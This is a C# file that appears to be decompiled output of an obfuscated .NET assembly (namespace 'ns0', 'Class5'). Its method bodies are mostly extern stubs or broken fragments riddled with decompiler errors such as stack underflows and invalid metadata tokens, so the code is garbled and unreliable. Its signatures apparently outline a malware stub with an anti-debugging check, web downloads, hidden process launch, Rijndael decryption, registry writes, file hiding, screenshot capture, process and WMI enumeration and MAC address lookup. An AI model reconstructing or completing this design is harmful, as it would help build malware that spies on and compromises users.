using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	private static readonly List<string> list_0;

	public static string string_2;

	public static string string_3;

	private static FileSystemWatcher fileSystemWatcher_0;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_4);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	private static extern string smethod_0();

	public static extern string smethod_1(string string_4);

	private static extern void Main();

	private static extern void smethod_2();

	private static extern bool smethod_3();

	private static bool smethod_4()
	{
		//Discarded unreachable code: IL_0007, IL_000b, IL_0010, IL_0016, IL_002a, IL_0031, IL_0038, IL_003e
		//IL_0002: Invalid comparison between Unknown and I4
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Incompatible stack heights: 0 vs 1
		//IL_0025: Incompatible stack heights: 0 vs 1
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Incompatible stack heights: 0 vs 1
		byte num = checked((byte)/*Error near IL_0001: Stack underflow*/);
		if ((int)/*Error near IL_0004: Stack underflow*/ <= (int)num)
		{
			_ = ((uint[])/*Error near IL_0006: Stack underflow*/)[/*Error near IL_0006: Stack underflow*/];
			/*Error near IL_0006: Unknown opcode: 0xFC*/;
		}
		/*Error: Unexpected end of block*/;
	}

	private static extern bool smethod_5();

	private static extern string smethod_6();

	private static extern void smethod_7();

	private static void smethod_8(object sender, FileSystemEventArgs e)
	{
	}

	private static void smethod_9()
	{
		//Discarded unreachable code: IL_0005, IL_000b
		/*Error: Invalid metadata token*/;
	}

	private static extern void smethod_10();

	public static extern bool smethod_11(string string_4);

	public Class5()
	{
		//Discarded unreachable code: IL_0006, IL_000b, IL_0012
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected I4, but got Unknown
		while (true)
		{
		}
	}

	static extern string smethod_12(string string_4);

	static WebClient smethod_13()
	{
		//Discarded unreachable code: IL_0006, IL_000b, IL_0011, IL_001c, IL_0028, IL_0032
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected I4, but got O
		//IL_0022: Unsupported input type for neg.
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		/*Error near IL_0001: Invalid metadata token*/;
	}

	static extern string smethod_14(string string_4, string string_5);

	static extern void smethod_15(WebClient webClient_0, string string_4, string string_5);

	static extern void smethod_16(Component component_0);

	static extern Process smethod_17();

	static extern ProcessStartInfo smethod_18();

	static extern void smethod_19(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0);

	static void smethod_20(ProcessStartInfo processStartInfo_0, string string_4)
	{
		//Discarded unreachable code: IL_0002, IL_0009
		//IL_0000: Unsupported input type for neg.
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		_ = 0 - /*Error near IL_0001: Stack underflow*/;
		/*Error near IL_0001: Unknown opcode: 0xF8*/;
	}

	static string smethod_21(string string_4, string string_5, string string_6)
	{
		//Discarded unreachable code: IL_0006, IL_000c, IL_0013, IL_0018
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		((short[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (short)/*Error near IL_0001: Stack underflow*/;
		_ = /*Error near IL_0004: Stack underflow*/^ 1;
		/*Error near IL_0004: ldloc 3 (out-of-bounds)*/;
		/*Error near IL_0005: Unknown opcode: 0xF8*/;
	}

	static extern void smethod_22(ProcessStartInfo processStartInfo_0, string string_4);

	static extern void smethod_23(Process process_0, ProcessStartInfo processStartInfo_0);

	static extern bool smethod_24(Process process_0);

	static extern void smethod_25(int int_0);

	static extern void smethod_26(string string_4);

	static extern string smethod_27(string string_4);

	static extern byte[] smethod_28(string string_4);

	static extern RijndaelManaged smethod_29();

	static extern void smethod_30(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern void smethod_31(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern Encoding smethod_32();

	static extern byte[] smethod_33(Encoding encoding_0, string string_4);

	static extern void smethod_34(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_35(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_36(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0);

	static extern void smethod_37(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0);

	static extern byte[] smethod_38(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern byte[] smethod_39(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern ICryptoTransform smethod_40(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1);

	static extern byte[] smethod_41(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1);

	static extern Encoding smethod_42();

	unsafe static string smethod_43(Encoding encoding_0, byte[] byte_0)
	{
		//Discarded unreachable code: IL_0013, IL_001b, IL_001c
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		while (/*Error near IL_0006: Stack underflow*/ >= /*Error near IL_0006: Stack underflow*/)
		{
		}
		((double[])/*Error near IL_0007: Stack underflow*/)[/*Error near IL_0007: Stack underflow*/] = (double)/*Error near IL_0007: Stack underflow*/;
		_003F val = /*Error near IL_0007: ldloca 0 (out-of-bounds)*/;
		_ = *(int*)checked((ulong)(/*Error near IL_000a: Stack underflow*/ - val));
		/*Error near IL_000e: Invalid metadata token*/;
	}

	static extern void smethod_44(IDisposable idisposable_0);

	static extern Assembly smethod_45();

	static extern string smethod_46(Assembly assembly_0);

	static extern void smethod_47(string string_4, string string_5, bool bool_5);

	static RegistryKey smethod_48(RegistryKey registryKey_0, string string_4, bool bool_5)
	{
		//Discarded unreachable code: IL_0014, IL_001a, IL_0020, IL_002b
		//IL_0009: Invalid comparison between I and Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		while ((nint)checked((nuint)(object)registryKey_0) > (nint)/*Error near IL_0008: ldloc 3 (out-of-bounds)*/)
		{
		}
		checked
		{
			_ = (uint)/*Error near IL_000f: Stack underflow*/;
			/*Error near IL_000f: Invalid metadata token*/;
		}
	}

	static void smethod_49(RegistryKey registryKey_0, string string_4, object object_0)
	{
		//Discarded unreachable code: IL_0006, IL_0011, IL_001d, IL_0024
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Incompatible stack heights: 0 vs 1
		//IL_001f: Invalid comparison between Unknown and O
		while (true)
		{
		}
	}

	static void smethod_50(string string_4, FileAttributes fileAttributes_0)
	{
		//IL_0009: Invalid comparison between Unknown and O
		while (2u != 0 || /*Error near IL_000e: Stack underflow*/< string_4)
		{
		}
		/*Error near IL_000e: stloc 0 (out-of-bounds)*/;
	}

	unsafe static RegistryKey smethod_51(RegistryKey registryKey_0, string string_4)
	{
		//Discarded unreachable code: IL_000e, IL_0013, IL_0018, IL_0021, IL_0026
		//IL_0004: Invalid comparison between Unknown and Ref
		//IL_001a: Expected I, but got I8
		//IL_002c: Expected O, but got I4
		while (true)
		{
			if (!System.Runtime.CompilerServices.Unsafe.IsAddressGreaterThan(ref *(byte*)/*Error near IL_0009: Stack underflow*/, ref *(byte*)(&registryKey_0)))
			{
			}
		}
	}

	static extern void smethod_52(RegistryKey registryKey_0);

	static extern Rectangle smethod_53(Point point_0);

	static extern Bitmap smethod_54(int int_0, int int_1);

	static extern Graphics smethod_55(Image image_0);

	static void smethod_56(Graphics graphics_0, Point point_0, Point point_1, Size size_0)
	{
		//Discarded unreachable code: IL_0005
		((long[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (long)/*Error near IL_0001: Stack underflow*/;
		nuint num = checked((nuint)/*Error near IL_0003: Stack underflow*/);
		((IntPtr[])/*Error near IL_0004: Stack underflow*/)[/*Error near IL_0004: Stack underflow*/] = (nint)num;
		/*Error near IL_0004: Unknown opcode: 0xF8*/;
	}

	static extern ImageFormat smethod_57();

	static extern void smethod_58(Image image_0, string string_4, ImageFormat imageFormat_0);

	static extern bool smethod_59(string string_4);

	static extern void smethod_60(Process process_0);

	static extern string[] smethod_61(string string_4, char[] char_0);

	static extern string smethod_62(WebClient webClient_0, string string_4);

	static extern string smethod_63();

	static string smethod_64()
	{
		//Discarded unreachable code: IL_0001, IL_000c, IL_0016, IL_001f, IL_0026
		//IL_0007: Expected I4, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected I, but got Unknown
		//IL_0021: Invalid comparison between Unknown and I4
		/*Error: Unknown opcode: 0xFC*/;
	}

	static extern string smethod_65(string[] string_4);

	static extern void smethod_66(string string_4, string string_5);

	static extern Process[] smethod_67();

	static extern string smethod_68(Process process_0);

	unsafe static void smethod_69(Process process_0)
	{
		//Discarded unreachable code: IL_000b, IL_0014, IL_0018, IL_001d
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Expected I8, but got Unknown
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		_003F val = checked(/*Error near IL_0001: Stack underflow*/ * /*Error near IL_0001: Stack underflow*/);
		*(long*)(nint)/*Error near IL_0002: Stack underflow*/ = (long)val;
		_ = (nint)(/*Error near IL_0004: Stack underflow*/ >> (int)/*Error near IL_0004: Stack underflow*/);
		/*Error near IL_0006: Invalid metadata token*/;
	}

	unsafe static Process smethod_70()
	{
		//Discarded unreachable code: IL_0004, IL_0009
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		short num = ((short[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		*(short*)(nint)/*Error near IL_0002: Stack underflow*/ = num;
		_ = (int)/*Error near IL_0003: Stack underflow*/;
		/*Error near IL_0003: Unknown opcode: 0xF8*/;
	}

	static extern IntPtr smethod_71(Process process_0);

	static extern ManagementObjectSearcher smethod_72(string string_4);

	unsafe static ManagementObjectCollection smethod_73(ManagementObjectSearcher managementObjectSearcher_0)
	{
		//Discarded unreachable code: IL_0024, IL_0027
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Invalid comparison between Unknown and I
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if (/*Error near IL_0005: Stack underflow*/ < /*Error near IL_0005: Stack underflow*/)
			{
				*(_003F*)(nint)/*Error near IL_0006: Stack underflow*/ = /*Error near IL_0006: Stack underflow*/;
				nint num2;
				checked
				{
					ulong num = (ulong)/*Error near IL_0008: Stack underflow*/;
					managementObjectSearcher_0 = managementObjectSearcher_0;
					num2 = (nint)unchecked((uint)(*(sbyte*)checked((nint)(num * managementObjectSearcher_0 * 5))));
				}
				if ((nint)/*Error near IL_001e: Stack underflow*/ < num2)
				{
					break;
				}
			}
		}
		((long[])/*Error near IL_001f: Stack underflow*/)[/*Error near IL_001f: Stack underflow*/] = (long)/*Error near IL_001f: Stack underflow*/;
		/*Error near IL_001f: Invalid metadata token*/;
	}

	static extern ManagementObjectEnumerator smethod_74(ManagementObjectCollection managementObjectCollection_0);

	unsafe static ManagementBaseObject smethod_75(ManagementObjectEnumerator managementObjectEnumerator_0)
	{
		//Discarded unreachable code: IL_000d
		//IL_0005: Expected native int or pointer, but got O
		_ = *(IntPtr*)unchecked((nint)"");
		_ = 4;
		/*Error near IL_0008: Invalid metadata token*/;
	}

	static extern object smethod_76(ManagementBaseObject managementBaseObject_0, string string_4);

	static string smethod_77(object object_0)
	{
		//Discarded unreachable code: IL_0006
		_ = (nuint)/*Error near IL_0001: Stack underflow*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	static extern string smethod_78(string string_4);

	static extern bool smethod_79(string string_4, string string_5);

	static extern string smethod_80(string string_4);

	static extern bool smethod_81(string string_4, string string_5);

	static extern bool smethod_82(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern NetworkInterface[] smethod_83();

	static extern OperationalStatus smethod_84(NetworkInterface networkInterface_0);

	unsafe static PhysicalAddress smethod_85(NetworkInterface networkInterface_0)
	{
		//Discarded unreachable code: IL_0006, IL_000d, IL_0014
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Expected F8, but got I4
		*(double*)(nint)(/*Error near IL_0002: Stack underflow*/ ^ /*Error near IL_0002: Stack underflow*/) = 1.0;
		checked
		{
			_ = (int)/*Error near IL_0005: Stack underflow*/;
			/*Error near IL_0005: Unknown opcode: 0xF8*/;
		}
	}

	static extern string smethod_86(string string_4, char[] char_0);

	static extern FileSystemWatcher smethod_87();

	unsafe static string smethod_88(Environment.SpecialFolder specialFolder_0)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected I8, but got I4
		((sbyte[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (sbyte)/*Error near IL_0001: Stack underflow*/;
		_ = /*Error near IL_0004: Stack underflow*/| /*Error near IL_0004: Stack underflow*/;
		/*Error near IL_0004: stloc 3 (out-of-bounds)*/;
		*(long*)(nint)/*Error near IL_0007: Stack underflow*/ = 7L;
		/*Error near IL_0007: Invalid metadata token*/;
	}

	static extern void smethod_89(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static void smethod_90(FileSystemWatcher fileSystemWatcher_1, NotifyFilters notifyFilters_0)
	{
		//Discarded unreachable code: IL_0005
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_91(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_92(FileSystemWatcher fileSystemWatcher_1, FileSystemEventHandler fileSystemEventHandler_0);

	static extern void smethod_93(FileSystemWatcher fileSystemWatcher_1, bool bool_5);

	static extern bool smethod_94(string string_4, string string_5);

	unsafe static bool smethod_95(string string_4)
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_0010
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		*(_003F*)(nint)/*Error near IL_0003: Stack underflow*/ = /*Error near IL_0003: Stack underflow*/;
		_ = *(byte*)(nint)/*Error near IL_0004: Stack underflow*/;
		/*Error near IL_0004: Unknown opcode: 0xFF*/;
	}

	static extern string[] smethod_96(string string_4, string string_5);

	static extern Match smethod_97(string string_4, string string_5);

	static extern WebHeaderCollection smethod_98(WebClient webClient_0);

	static extern void smethod_99(WebHeaderCollection webHeaderCollection_0, HttpRequestHeader httpRequestHeader_0, string string_4);
}
